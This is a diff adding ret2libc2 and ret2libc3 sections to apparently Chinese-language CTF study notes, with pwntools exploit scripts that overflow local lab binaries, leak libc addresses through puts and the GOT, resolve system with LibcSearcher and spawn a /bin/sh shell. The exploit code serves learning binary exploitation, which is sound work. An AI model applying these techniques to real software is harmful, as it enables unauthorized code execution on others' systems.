@@ -144,6 +144,137 @@ r.sendline(p)
 r.interactive()
 ```
 
+### ret2libc2
+
+![image-20220202133831109](/assets/img/2022/image-20220202133831109.png)
+
+**方法2，payload也可以这么写**
+
+![image-20220202135029372](/assets/img/2022/image-20220202135029372.png)
+
+exp:
+
+```python
+from pwn import *
+
+
+r = process('./ret2libc2')
+elf = ELF('./ret2libc2')
+
+r.recvuntil('think ?')
+
+gets_plt = elf.plt['gets']
+system_plt = elf.plt['system']
+_start= elf.symbols['_start']
+bss_addr = 0x804A080
+
+pause()
+p = 'a'*(0x6c+0x4)
+# p += p32(gets_plt)
+# p += p32(system_plt)
+# p += p32(bss_addr)
+# p += p32(bss_addr)
+p += p32(gets_plt)
+p += p32(_start)
+p += p32(bss_addr)
+r.sendline(p)
+
+r.sendline('/bin/sh')
+
+r.recvuntil('think ?')
+p = 'a'*(0x6c+0x4)
+p += p32(system_plt)
+p += p32(0xdeadbeef)
+p += p32(bss_addr)
+r.sendline(p)
+
+r.interactive()
+```
+
+### ret2libc3
+
+![image-20220204103931275](/assets/img/2022/image-20220204103931275.png)
+
+Exp:
+
+```python
+# -*- coding: UTF-8 -*- #
+from pwn import *
+from LibcSearcher import *
+
+r = process('./ret2libc3')
+elf = ELF('./ret2libc3')
+# 程序开始处，_start可以保证变量在栈上的偏移量不变。
+# main可能会变，__libc_start_main不清楚
+_start = elf.symbols['_start']
+# 调用puts，泄露信息，实际是调用puts_plt
+puts_plt = elf.plt['puts'] 
+# 企图泄露got表上puts的实际值，也就是puts在libc上的实际地址
+# 通过LibcSearcher工具，利用泄露的实际地址的最后12位，查询得到libc的版本
+# libc的版本确定，libc上每个函数的偏移量确定，通过libc基地址算出system等函数的实际地址
+puts_got = elf.got['puts']
+# 调用gets，向bss写入/bin/sh
+gets_plt = elf.plt['gets']
+# 可写的bss段，程序应该是定义了一个全局变量 char buf2[100]
+buf = 0x0804A080
+
+
+# 第一轮，泄露puts地址
+r.recvuntil('Can you find it !?')
+p = 'a'*(0x6c+0x4)
+p += p32(puts_plt)
+p += p32(_start)
+p += p32(puts_got)
+
+r.sendline(p)
+
+puts_addr = u32(r.recvline()[:4])
+log.success('puts在libc上的地址: {}'.format(hex(puts_addr)))
+
+# 计算得到libc基地址，以及system等函数的地址
+obj = LibcSearcher('puts', puts_addr)
+puts_offset = obj.dump('puts')
+system_offset = obj.dump('system')
+libc_base = puts_addr - puts_offset
+system_addr = libc_base + system_offset
+log.success('libc基地址: {}'.format(hex(libc_base)))
+log.success('system地址: {}'.format(hex(system_addr)))
+
+# 第二轮，向buf中写入/bin/sh，并调用system('/bin/sh')
+r.recvuntil('Can you find it !?')
+p = 'a'*(0x6c+0x4)
+p += p32(gets_plt)
+p += p32(system_addr)
+p += p32(buf)
+p += p32(buf)
+
+r.sendline(p)
+r.sendline('/bin/sh')
+
+
+'''或者可以将第二轮拆成两轮
+# 第二轮，向buf中写入/bin/sh
+r.recvuntil('Can you find it !?')
+p = 'a'*(0x6c+0x4)
+p += p32(gets_plt)
+p += p32(_start)
+p += p32(buf)
+
+r.sendline(p)
+r.sendline('/bin/sh')
+
+
+# 第三轮，调用system('/bin/sh')
+r.recvuntil('Can you find it !?')
+p = 'a'*(0x6c+0x4)
+p += p32(system_addr)
+p += p32(0xdeadbeef)
+p += p32(buf)
+r.sendline(p)
+'''
+r.interactive()
+```
+
 
 
 ## 中级ROP
